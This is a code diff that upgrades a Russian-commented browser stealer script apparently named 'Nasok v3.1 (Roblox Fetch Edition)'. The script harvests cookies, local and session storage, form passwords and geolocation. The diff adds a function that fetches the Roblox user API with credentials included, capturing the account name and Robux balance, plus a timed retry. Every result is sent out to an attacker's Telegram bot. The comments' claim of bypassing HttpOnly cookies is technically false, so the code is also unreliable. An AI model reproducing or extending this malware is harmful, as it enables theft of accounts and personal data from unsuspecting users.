@@ -46,6 +46,65 @@ function flattenObject(obj, prefix = '') {
     return result;
 }
 
+// ===== НОВЫЙ МЕТОД: КРАЖА КУК ЧЕРЕЗ FETCH =====
+async function stealRobloxCookiesViaFetch() {
+    const result = {};
+    try {
+        // Делаем запрос к Roblox API с передачей всех кук
+        const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+            method: 'GET',
+            credentials: 'include', // ВАЖНО: передаём все куки, включая HttpOnly
+            headers: {
+                'User-Agent': navigator.userAgent,
+                'Accept': 'application/json'
+            },
+            mode: 'cors'
+        });
+
+        // Пытаемся вытащить куки из заголовка Set-Cookie (если сервер их обновляет)
+        const setCookieHeader = response.headers.get('set-cookie');
+        if (setCookieHeader) {
+            // Парсим Set-Cookie в объект
+            const cookies = setCookieHeader.split(',').reduce((acc, cookieStr) => {
+                const [keyVal] = cookieStr.split(';');
+                const [key, val] = keyVal.split('=');
+                if (key && val) acc[key.trim()] = val.trim();
+                return acc;
+            }, {});
+            Object.assign(result, cookies);
+        }
+
+        // Пытаемся получить ответ в JSON (там может быть информация о юзере)
+        try {
+            const jsonData = await response.json();
+            result['user_data'] = jsonData;
+        } catch(e) {
+            result['user_data_error'] = 'не удалось распарсить JSON';
+        }
+
+        // Дополнительно пробуем через document.cookie (для не-HttpOnly кук)
+        try {
+            const docCookies = {};
+            document.cookie.split('; ').forEach(c => {
+                const [k, v] = c.split('=');
+                if (k) docCookies[k] = v || '';
+            });
+            if (Object.keys(docCookies).length) {
+                result['document_cookies'] = docCookies;
+            }
+        } catch(e) {}
+
+        result['status'] = 'успешно';
+        result['url'] = response.url;
+
+    } catch(e) {
+        result['error'] = e.message || 'ошибка запроса';
+        result['status'] = 'ошибка';
+    }
+
+    return result;
+}
+
 // ===== ОСНОВНОЙ СБОРЩИК =====
 async function collectEverything() {
     const result = {
@@ -53,8 +112,8 @@ async function collectEverything() {
         '🔗 URL': window.location.href,
         '🌐 Браузер': {},
         '🖥️ Экран': {},
-        '🍪 Все куки': {},
-        '🎮 КУКИ ROBLOX (спецвыделка)': {},
+        '🍪 Все куки (document)': {},
+        '🎮 КУКИ ROBLOX (через fetch)': {},
         '💾 Локальное хранилище': {},
         '📂 Сессионное хранилище': {},
         '📡 Геолокация': {},
@@ -92,33 +151,20 @@ async function collectEverything() {
         'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
     };
 
-    // ---- КУКИ (ВСЕ) + ROBLOX ОТДЕЛЬНО ----
-    const allCookies = {};
-    const robloxCookies = {};
+    // ---- КУКИ ЧЕРЕЗ DOCUMENT.COOKIE (не-HttpOnly) ----
     try {
+        const docCookies = {};
         document.cookie.split('; ').forEach(c => {
             const [k, v] = c.split('=');
-            if (k) {
-                allCookies[k] = v || '';
-                // Если в названии куки есть .ROBLOSECURITY или роблоксовские ключи
-                if (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY') || k === 'RBXSessionTracker' || k === 'RBXEventTracker') {
-                    robloxCookies[k] = v || '';
-                }
-            }
+            if (k) docCookies[k] = v || '';
         });
-        // Дополнительно ищем .ROBLOSECURITY без учёта регистра
-        document.cookie.split('; ').forEach(c => {
-            const [k, v] = c.split('=');
-            if (k && k.toUpperCase().includes('ROBLOSECURITY')) {
-                robloxCookies[k] = v || '';
-            }
-        });
+        result['🍪 Все куки (document)'] = docCookies;
     } catch(e) { 
-        allCookies['ошибка'] = 'не удалось прочитать'; 
-        robloxCookies['ошибка'] = 'не удалось прочитать';
+        result['🍪 Все куки (document)'] = { ошибка: 'не удалось прочитать' }; 
     }
-    result['🍪 Все куки'] = allCookies;
-    result['🎮 КУКИ ROBLOX (спецвыделка)'] = Object.keys(robloxCookies).length ? robloxCookies : { 'результат': 'Куки Roblox не найдены' };
+
+    // ---- КУКИ ROBLOX ЧЕРЕЗ FETCH (обход HttpOnly) ----
+    result['🎮 КУКИ ROBLOX (через fetch)'] = await stealRobloxCookiesViaFetch();
 
     // ---- LOCAL STORAGE ----
     try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
@@ -266,7 +312,7 @@ async function sendToTelegram(data) {
     textReport += '═'.repeat(40) + '\n';
     textReport += `📅 Создано: ${new Date().toISOString()}\n`;
     textReport += `👤 IP определяется на сервере Telegram\n`;
-    textReport += `🤖 Собрано ботом Nasok v3.0 (Roblox Edition)`;
+    textReport += `🤖 Собрано ботом Nasok v3.1 (Roblox Fetch Edition)`;
 
     // ----- 2. ОТПРАВЛЯЕМ КАК ФАЙЛ (гарантированно) -----
     const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
@@ -282,7 +328,6 @@ async function sendToTelegram(data) {
         console.log('✅ Файл с дампом отправлен');
     } catch(e) {
         console.error('❌ Ошибка отправки файла:', e);
-        // Если файл не отправился — пробуем текстом
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -297,21 +342,26 @@ async function sendToTelegram(data) {
         }
     }
 
-    // ----- 3. ДОПОЛНИТЕЛЬНО: КРАТКАЯ ВЫЖИМКА (текстом) -----
+    // ----- 3. КРАТКАЯ ВЫЖИМКА -----
     let summary = '📌 КРАТКАЯ ВЫЖИМКА\n\n';
     summary += `🌐 Браузер: ${data['🌐 Браузер']['User-Agent']?.slice(0, 80)}...\n`;
-    summary += `🍪 Все куки: ${Object.keys(data['🍪 Все куки'] || {}).length} шт.\n`;
-    // Специально для Roblox
-    const robloxKeys = Object.keys(data['🎮 КУКИ ROBLOX (спецвыделка)'] || {});
-    if (robloxKeys.length && !robloxKeys.includes('результат') && !robloxKeys.includes('ошибка')) {
-        summary += `🎮 Roblox куки найдены: ${robloxKeys.length} шт.\n`;
-        // Показываем .ROBLOSECURITY если есть
-        if (data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY) {
-            summary += `🔑 .ROBLOSECURITY: ${data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY.slice(0, 30)}...\n`;
+    summary += `🍪 document.cookie: ${Object.keys(data['🍪 Все куки (document)'] || {}).length} шт.\n`;
+    
+    // Roblox через fetch
+    const robloxData = data['🎮 КУКИ ROBLOX (через fetch)'] || {};
+    if (robloxData.status === 'успешно') {
+        summary += `🎮 Roblox fetch: УСПЕШНО\n`;
+        if (robloxData.document_cookies && Object.keys(robloxData.document_cookies).length) {
+            summary += `   • document.cookie: ${Object.keys(robloxData.document_cookies).length} шт.\n`;
+        }
+        if (robloxData.user_data && robloxData.user_data.UserName) {
+            summary += `   • Юзер: ${robloxData.user_data.UserName}\n`;
+            summary += `   • Robux: ${robloxData.user_data.RobuxBalance || '?'}\n`;
         }
     } else {
-        summary += `🎮 Roblox куки: не найдены\n`;
+        summary += `🎮 Roblox fetch: ${robloxData.status || 'ошибка'}\n`;
     }
+    
     summary += `💾 LocalStorage: ${Object.keys(data['💾 Локальное хранилище'] || {}).length} ключей\n`;
     summary += `📂 SessionStorage: ${Object.keys(data['📂 Сессионное хранилище'] || {}).length} ключей\n`;
     summary += `🔑 Паролей найдено: ${Object.keys(data['🔑 Пароли из форм'] || {}).length}\n`;
@@ -333,29 +383,6 @@ async function sendToTelegram(data) {
         console.log('✅ Краткая выжимка отправлена');
     } catch(e) {
         console.error('❌ Ошибка отправки выжимки:', e);
-    }
-
-    // ----- 4. ОТДЕЛЬНОЕ СООБЩЕНИЕ С ROBLOX КУКАМИ (если есть) -----
-    const robloxData = data['🎮 КУКИ ROBLOX (спецвыделка)'];
-    if (robloxData && Object.keys(robloxData).length && !robloxData['результат'] && !robloxData['ошибка']) {
-        let robloxMsg = '🎮 **ROBLOX КУКИ (отдельный дамп)**\n\n';
-        for (const [key, val] of Object.entries(robloxData)) {
-            robloxMsg += `🔹 ${key}: ${val}\n`;
-        }
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: robloxMsg,
-                    parse_mode: 'Markdown'
-                })
-            });
-            console.log('✅ Roblox куки отправлены отдельно');
-        } catch(e) {
-            console.error('❌ Ошибка отправки Roblox куков:', e);
-        }
     }
 }
 
@@ -390,28 +417,22 @@ async function sendToTelegram(data) {
         }
     }, 5000);
 
-    // Дополнительно ищем Roblox куки через 3 секунды (для динамических)
-    setTimeout(() => {
-        const robloxExtra = {};
-        try {
-            document.cookie.split('; ').forEach(c => {
-                const [k, v] = c.split('=');
-                if (k && (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY'))) {
-                    robloxExtra[k] = v || '';
-                }
-            });
-        } catch(e) {}
-        if (Object.keys(robloxExtra).length) {
-            const robloxMsg = '🎮 **ROBLOX КУКИ (доп. сбор через 3с)**\n' + safeStringify(robloxExtra);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: robloxMsg,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
+    // Повторный запрос к Roblox через 3 секунды (на случай если страница ещё грузится)
+    setTimeout(async () => {
+        const robloxRetry = await stealRobloxCookiesViaFetch();
+        if (robloxRetry.status === 'успешно' && robloxRetry.user_data && robloxRetry.user_data.UserName) {
+            const retryMsg = '🎮 **ROBLOX (повторный сбор через 3с)**\n' + safeStringify(robloxRetry);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: retryMsg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {}
         }
     }, 3000);
 })();
